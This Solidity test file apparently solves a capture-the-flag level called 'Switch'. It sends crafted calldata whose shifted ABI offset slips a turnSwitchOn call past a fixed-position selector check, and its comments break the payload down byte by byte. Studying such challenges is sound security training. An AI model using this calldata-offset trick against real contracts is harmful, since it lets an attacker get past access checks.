// SPDX-License-Identifier: UNLICENSED
// forge test -vvvvv --match-path '*27-GoodSamaritanTwo.t.sol'
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/29-Switch.sol";
import "../contracts/29-SwitchFactory.sol";
import "../lib/forge-std/src/console2.sol";

contract SwitchTest is Test {

    SwitchFactory public factoryContract;
    address public eoa;
    address public challengeAddress;

    function createUsers(uint256 userNum) internal returns (address[] memory) {
        address[] memory users = new address[](userNum);
        for (uint256 i = 0; i < userNum; i++) {
            // Compute the address from the given priv key
            address user = vm.addr(uint256(keccak256(abi.encodePacked(i))));

            // Fund user with 100 Eth
            vm.deal(user, 100);
            users[i] = user;
        }
        return users;
    }

    function setUp() public {
        // Create EOA and take the 0th (1st) element from the returned array
        eoa = createUsers(1)[0];
        // log eoa address
        console2.log("eoa:", eoa);

        // Deploy factory to create challenge instance
        factoryContract = new SwitchFactory();

        // Deploy challenge contract
        challengeAddress = factoryContract.createInstance{value: 0.001 ether}(address(eoa));
    }

    // function afterRun() public returns (bool) {
    //     console2.log("Running afterRun");
    //     return false;
    // }

    function testCheck() public {
        address payable payableChallengeAddress = payable(challengeAddress);
        Switch challenge = Switch(payableChallengeAddress);

        // Get Challenge Instance
        vm.startPrank(eoa, eoa);

        // We must use call!
        address(challenge).call(hex'30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000');

        // Check if attack was successful
        assert(factoryContract.validateInstance(payableChallengeAddress, eoa));
    }
} 

// The below passes the turnSwitchOff test (is `Test` concatenated)
// 30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000

// Test (successfully calls turnSwitchOff):
// 30c13ade //flipswitch selector
// 0000000000000000000000000000000000000000000000000000000000000020 // data offset for bytes array passed in
// 0000000000000000000000000000000000000000000000000000000000000004 // data length (4bytes long, ie 1 selectors)
// 20606e1500000000000000000000000000000000000000000000000000000000 // turnSwitchOff selector

// Successful solution:
// 30c13ade //flipswitch selector
// 0000000000000000000000000000000000000000000000000000000000000060 // data offset (0x 60 = 96 in decimal)
// 0000000000000000000000000000000000000000000000000000000000000000 // spacer
// 20606e1500000000000000000000000000000000000000000000000000000000 // turnSwitchOff selector at 68, to satisfy the check
// 0000000000000000000000000000000000000000000000000000000000000004 // data length (4bytes long, ie 1 selectors)
// 76227e1200000000000000000000000000000000000000000000000000000000 // turnSwitchOn selector